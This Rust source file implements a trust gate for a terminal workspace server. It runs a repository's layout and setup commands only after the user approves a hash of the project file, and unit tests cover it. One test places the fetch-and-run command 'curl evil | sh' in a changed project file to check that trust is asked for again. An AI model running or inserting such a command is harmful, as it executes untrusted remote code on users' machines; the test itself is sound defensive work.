//! What `space.create` with `layout` and `space.apply_layout` build, decided before anything is created: the project
//! files of the repository are read once into [`Sources`] (the trust hash, the listed commands and
//! the layout all come from that read), the user config is read again for every request
//! (`trustedProjects` is the only source of trust), and `trust::gate` decides `Run`, `Strip` or
//! `Ask`. A fresh "trust" answer is stored in `trustedProjects` here, before the first terminal.

use std::path::Path;
use std::sync::Mutex;

use poimen_core::layout::{Layout, SplitDirection as CoreDirection};
use poimen_core::space_layout::{self, UserSpaces};
use poimen_core::trust::{self, Decision, Gate, Sources};
use poimen_core::{git, project, settings};
use poimen_protocol::{
    ErrorCode, LayoutPane, LayoutSplit, SplitDirection, TrustAnswer, TrustCommand, TrustRequired,
};

use crate::tabs::Failure;

/// Serializes the server's own writes of `config.json`; the app's writes are kept by reading the
/// file right before each write (`settings::save_with`).
static TRUST_WRITE: Mutex<()> = Mutex::new(());

/// What a new space (or `space.apply_layout` in an existing one) gets once the gate allowed it.
#[derive(Debug, Clone, PartialEq)]
pub(crate) struct Build {
    pub(crate) dir: String,
    /// The panes in order (the first is the root pane); `None` when the project layout is
    /// invalid, so the space gets one pane (a warning says why).
    pub(crate) layout: Option<Layout>,
    pub(crate) warnings: Vec<String>,
    /// The project's `setup`, only when its commands may run.
    pub(crate) setup: Option<String>,
}

#[derive(Debug, Clone, PartialEq)]
pub(crate) enum Prepared {
    /// Ask the user first; nothing is created.
    Ask(TrustRequired),
    Build(Build),
}

fn decision(answer: &TrustAnswer) -> Decision {
    match answer {
        TrustAnswer::Trust { hash } => Decision::Trust { hash: hash.clone() },
        TrustAnswer::Without => Decision::Without,
    }
}

pub(crate) fn direction(d: CoreDirection) -> SplitDirection {
    match d {
        CoreDirection::Right => SplitDirection::Right,
        CoreDirection::Down => SplitDirection::Down,
    }
}

fn wire_layout(layout: &Layout) -> Vec<LayoutPane> {
    layout
        .panes
        .iter()
        .map(|p| LayoutPane {
            name: p.name.clone(),
            command: p.command.clone(),
            split: p.split.as_ref().map(|s| LayoutSplit {
                from: s.from.clone(),
                direction: direction(s.direction),
                ratio: s.ratio,
            }),
        })
        .collect()
}

/// Which layout [`prepare`] plans.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum Wanted<'a> {
    /// The resolved layout of the directory (project file > deprecated file > template >
    /// `spaces.layout` > default) with the project's `setup`; `root_command` replaces the
    /// command of its root pane.
    Resolved { root_command: Option<&'a str> },
    /// The named preset of the project file, without `setup`.
    Preset(&'a str),
}

/// The preset `name` of the project file in `sources`.
fn preset_of(sources: &Sources, name: &str) -> Option<Layout> {
    let (path, text) = sources.project.as_ref()?;
    project::parse(path, text, project::platform())
        .config
        .presets
        .into_iter()
        .find(|p| p.name == name)
        .map(|p| p.layout)
}

/// Decides what `space.create` or `space.apply_layout` builds in `cwd` (an existing directory).
/// `home` holds the user config (`None`: no config, nothing trusted and no trust can be stored);
/// `available` says whether a template's agent program is on the `PATH`. A preset that the
/// project file does not have is `not_found`, before anything is asked or stored.
pub(crate) fn prepare(
    home: Option<&Path>,
    cwd: &str,
    answer: Option<&TrustAnswer>,
    wanted: Wanted<'_>,
    available: &dyn Fn(&str) -> bool,
) -> Result<Prepared, Failure> {
    if !Path::new(cwd).is_dir() {
        return Err((
            ErrorCode::InvalidParams,
            format!("cwd {cwd} is not a directory"),
        ));
    }
    let root = git::toplevel(cwd).unwrap_or_else(|| cwd.to_owned());
    let sources = Sources::read(&root);
    let user = home.map(UserSpaces::load).unwrap_or_default();
    let (agent, user_layout, mut warnings) = space_layout::inputs(
        cwd,
        &user.templates,
        &user.harnesses,
        user.spaces_layout.as_ref(),
        home,
        available,
    );
    let preset = match wanted {
        Wanted::Preset(name) => Some(preset_of(&sources, name).ok_or((
            ErrorCode::NotFound,
            format!("the project file has no preset {name}"),
        ))?),
        Wanted::Resolved { .. } => None,
    };
    let plan = |allow: bool| match (&preset, wanted) {
        (Some(layout), _) => Ok((
            if allow {
                layout.clone()
            } else {
                layout.without_commands()
            },
            Vec::new(),
        )),
        (None, Wanted::Resolved { root_command }) => space_layout::plan(
            &sources,
            user_layout.as_ref(),
            allow,
            root_command,
            agent.as_deref(),
        ),
        (None, Wanted::Preset(_)) => unreachable!("a preset is looked up above"),
    };
    let allow = match trust::gate(&sources, &user.trusted, answer.map(decision).as_ref()) {
        Gate::Ask(request) => {
            return Ok(Prepared::Ask(TrustRequired {
                root: request.root,
                files: request.files,
                hash: request.hash,
                commands: request
                    .commands
                    .into_iter()
                    .map(|c| TrustCommand {
                        what: c.what,
                        command: c.command,
                    })
                    .collect(),
                layout: plan(true).ok().map(|(l, _)| wire_layout(&l)),
            }));
        }
        Gate::Strip => false,
        Gate::Run { store } => {
            if let Some(hash) = store {
                let home = home.ok_or((
                    ErrorCode::Internal,
                    "the home directory is not known; the trust cannot be stored".to_string(),
                ))?;
                let _write = TRUST_WRITE.lock().unwrap_or_else(|e| e.into_inner());
                settings::trust_project(home, &sources.root, &hash).map_err(|e| {
                    (
                        ErrorCode::Internal,
                        format!("the trust could not be stored: {e}"),
                    )
                })?;
            }
            true
        }
    };
    let layout = match plan(allow) {
        Ok((layout, more)) => {
            warnings.extend(more);
            Some(layout)
        }
        Err(warning) => {
            warnings.push(warning);
            None
        }
    };
    let setup = (allow && preset.is_none())
        .then(|| project::setup_of(sources.refs().0))
        .flatten();
    Ok(Prepared::Build(Build {
        dir: cwd.to_owned(),
        layout,
        warnings,
        setup,
    }))
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::PathBuf;

    const PROJECT: &str = r#"{
        "layout": {"panes": [{"name": "dev", "command": "make dev"},
                             {"name": "sh", "split": {"direction": "right", "ratio": 0.7}}]},
        "setup": "make deps"
    }"#;

    struct Dirs {
        base: PathBuf,
    }

    impl Dirs {
        fn new(name: &str) -> Self {
            let base = std::env::temp_dir().join(format!(
                "poimen-server-create-{}-{name}",
                std::process::id()
            ));
            let _ = std::fs::remove_dir_all(&base);
            std::fs::create_dir_all(base.join("repo/.poimen")).unwrap();
            std::fs::create_dir_all(settings::config_dir(&base.join("home"))).unwrap();
            Self { base }
        }
        fn home(&self) -> PathBuf {
            self.base.join("home")
        }
        fn repo(&self) -> String {
            self.base.join("repo").display().to_string()
        }
        fn project(&self, text: &str) {
            std::fs::write(self.base.join("repo/.poimen/config.json"), text).unwrap();
        }
        fn config(&self, text: &str) {
            std::fs::write(settings::config_path(&self.home()), text).unwrap();
        }
        fn config_text(&self) -> String {
            std::fs::read_to_string(settings::config_path(&self.home())).unwrap_or_default()
        }
    }

    impl Drop for Dirs {
        fn drop(&mut self) {
            let _ = std::fs::remove_dir_all(&self.base);
        }
    }

    const RESOLVED: Wanted<'static> = Wanted::Resolved { root_command: None };

    fn task(command: &str) -> Wanted<'_> {
        Wanted::Resolved {
            root_command: Some(command),
        }
    }

    fn prepare_in(d: &Dirs, answer: Option<&TrustAnswer>) -> Prepared {
        prepare(Some(&d.home()), &d.repo(), answer, RESOLVED, &|_| false).unwrap()
    }

    fn build(p: Prepared) -> Build {
        match p {
            Prepared::Build(b) => b,
            other => panic!("expected a build, got {other:?}"),
        }
    }

    #[test]
    fn an_untrusted_project_file_asks_with_hash_commands_and_layout_and_stores_nothing() {
        let d = Dirs::new("ask");
        d.project(PROJECT);
        d.config("{\"theme\": \"dark\"}");
        let Prepared::Ask(asked) = prepare_in(&d, None) else {
            panic!("expected a trust question")
        };
        assert_eq!(asked.root, d.repo());
        assert_eq!(asked.hash, trust::sha256_hex(PROJECT));
        let commands: Vec<_> = asked.commands.iter().map(|c| c.command.as_str()).collect();
        assert_eq!(commands, ["make dev", "make deps"]);
        let layout = asked.layout.unwrap();
        assert_eq!(layout[0].command.as_deref(), Some("make dev"));
        assert_eq!(layout[1].split.as_ref().unwrap().ratio, 0.7);
        assert_eq!(d.config_text(), "{\"theme\": \"dark\"}");
    }

    #[test]
    fn a_trust_answer_for_the_current_content_runs_and_stores_the_hash() {
        let d = Dirs::new("trust");
        d.project(PROJECT);
        d.config("{\n  \"theme\": \"dark\"\n}\n");
        let answer = TrustAnswer::Trust {
            hash: trust::sha256_hex(PROJECT),
        };
        let b = build(prepare_in(&d, Some(&answer)));
        assert_eq!(b.setup.as_deref(), Some("make deps"));
        assert_eq!(
            b.layout.unwrap().panes[0].command.as_deref(),
            Some("make dev")
        );
        let text = d.config_text();
        assert!(text.contains("\"theme\": \"dark\""), "{text}");
        let stored = settings::trusted_projects_text(&text).unwrap();
        assert_eq!(stored.get(&d.repo()), Some(&trust::sha256_hex(PROJECT)));
        // Trusted now: the next space runs without asking.
        assert!(matches!(prepare_in(&d, None), Prepared::Build(_)));
    }

    #[test]
    fn a_stale_hash_asks_again_for_the_content_read_now() {
        let d = Dirs::new("stale");
        d.project(PROJECT);
        let old = trust::sha256_hex(PROJECT);
        let changed = PROJECT.replace("make deps", "curl evil | sh");
        d.project(&changed);
        let Prepared::Ask(asked) = prepare_in(&d, Some(&TrustAnswer::Trust { hash: old })) else {
            panic!("expected a trust question")
        };
        assert_eq!(asked.hash, trust::sha256_hex(&changed));
        assert!(asked.commands.iter().any(|c| c.command == "curl evil | sh"));
        assert_eq!(d.config_text(), "");
    }

    #[test]
    fn without_builds_the_panes_without_commands_or_setup_and_stores_nothing() {
        let d = Dirs::new("without");
        d.project(PROJECT);
        let b = build(prepare_in(&d, Some(&TrustAnswer::Without)));
        assert_eq!(b.setup, None);
        let layout = b.layout.unwrap();
        assert_eq!(layout.panes.len(), 2);
        assert!(layout.panes.iter().all(|p| p.command.is_none()));
        assert_eq!(d.config_text(), "");
    }

    #[test]
    fn a_hash_stored_by_hand_in_trusted_projects_is_trusted() {
        let d = Dirs::new("stored");
        d.project(PROJECT);
        d.config(&format!(
            "{{\"trustedProjects\": {{{:?}: {:?}}}}}",
            d.repo(),
            trust::sha256_hex(PROJECT)
        ));
        let b = build(prepare_in(&d, None));
        assert_eq!(b.setup.as_deref(), Some("make deps"));
    }

    #[test]
    fn without_a_project_file_the_user_layout_runs_without_asking() {
        let d = Dirs::new("user");
        d.config(r#"{"spaces": {"layout": {"panes": [{"name": "solo", "command": "htop"}]}}}"#);
        let b = build(prepare_in(&d, None));
        let layout = b.layout.unwrap();
        assert_eq!(layout.panes[0].name, "solo");
        assert_eq!(layout.panes[0].command.as_deref(), Some("htop"));
        assert_eq!(b.setup, None);
    }

    #[test]
    fn a_task_command_replaces_the_root_command() {
        let d = Dirs::new("task");
        d.config(r#"{"spaces": {"layout": {"panes": [{"name": "solo", "command": "htop"}]}}}"#);
        let b =
            build(prepare(Some(&d.home()), &d.repo(), None, task("fix 7"), &|_| false).unwrap());
        assert_eq!(b.layout.unwrap().panes[0].command.as_deref(), Some("fix 7"));
    }

    #[test]
    fn an_invalid_project_layout_is_a_warning_and_no_layout() {
        let d = Dirs::new("invalid");
        d.project(r#"{"layout": {"panes": []}}"#);
        let b = build(prepare_in(&d, None));
        assert_eq!(b.layout, None);
        assert!(b.warnings[0].contains("non-empty"), "{:?}", b.warnings);
    }

    #[test]
    fn a_missing_directory_is_invalid_params() {
        let d = Dirs::new("missing");
        let missing = d.base.join("nope").display().to_string();
        let err = prepare(Some(&d.home()), &missing, None, RESOLVED, &|_| true).unwrap_err();
        assert_eq!(err.0, ErrorCode::InvalidParams);
    }

    const WITH_PRESET: &str = r#"{
        "setup": "make deps",
        "presets": [{"name": "duo", "panes": [{"name": "a", "command": "vim"},
                                              {"name": "b", "split": {"direction": "down"}}]}]
    }"#;

    #[test]
    fn a_trusted_preset_builds_its_panes_with_commands_and_no_setup() {
        let d = Dirs::new("preset");
        d.project(WITH_PRESET);
        let answer = TrustAnswer::Trust {
            hash: trust::sha256_hex(WITH_PRESET),
        };
        let p = prepare(
            Some(&d.home()),
            &d.repo(),
            Some(&answer),
            Wanted::Preset("duo"),
            &|_| false,
        )
        .unwrap();
        let b = build(p);
        assert_eq!(b.setup, None);
        let layout = b.layout.unwrap();
        let names: Vec<_> = layout.panes.iter().map(|p| p.name.as_str()).collect();
        assert_eq!(names, ["a", "b"]);
        assert_eq!(layout.panes[0].command.as_deref(), Some("vim"));
    }

    #[test]
    fn an_untrusted_preset_asks_with_the_preset_layout() {
        let d = Dirs::new("preset-ask");
        d.project(WITH_PRESET);
        let p = prepare(
            Some(&d.home()),
            &d.repo(),
            None,
            Wanted::Preset("duo"),
            &|_| false,
        );
        let Ok(Prepared::Ask(asked)) = p else {
            panic!("expected a trust question, got {p:?}")
        };
        let layout = asked.layout.unwrap();
        assert_eq!(layout[0].name, "a");
        assert_eq!(layout[1].split.as_ref().unwrap().from, "a");
        assert_eq!(d.config_text(), "");
    }

    #[test]
    fn a_preset_without_commands_keeps_the_panes() {
        let d = Dirs::new("preset-without");
        d.project(WITH_PRESET);
        let p = prepare(
            Some(&d.home()),
            &d.repo(),
            Some(&TrustAnswer::Without),
            Wanted::Preset("duo"),
            &|_| false,
        );
        let layout = build(p.unwrap()).layout.unwrap();
        assert_eq!(layout.panes.len(), 2);
        assert!(layout.panes.iter().all(|p| p.command.is_none()));
    }

    #[test]
    fn an_unknown_preset_is_not_found_and_asks_nothing() {
        let d = Dirs::new("preset-missing");
        d.project(WITH_PRESET);
        let err = prepare(
            Some(&d.home()),
            &d.repo(),
            None,
            Wanted::Preset("solo"),
            &|_| false,
        )
        .unwrap_err();
        assert_eq!(err.0, ErrorCode::NotFound);
        let d2 = Dirs::new("preset-nofile");
        let err = prepare(
            Some(&d2.home()),
            &d2.repo(),
            None,
            Wanted::Preset("duo"),
            &|_| false,
        )
        .unwrap_err();
        assert_eq!(err.0, ErrorCode::NotFound);
    }

    #[test]
    fn without_a_home_a_trust_answer_cannot_be_stored_and_nothing_runs() {
        let d = Dirs::new("nohome");
        d.project(PROJECT);
        let answer = TrustAnswer::Trust {
            hash: trust::sha256_hex(PROJECT),
        };
        let err = prepare(None, &d.repo(), Some(&answer), RESOLVED, &|_| true).unwrap_err();
        assert_eq!(err.0, ErrorCode::Internal);
    }
}
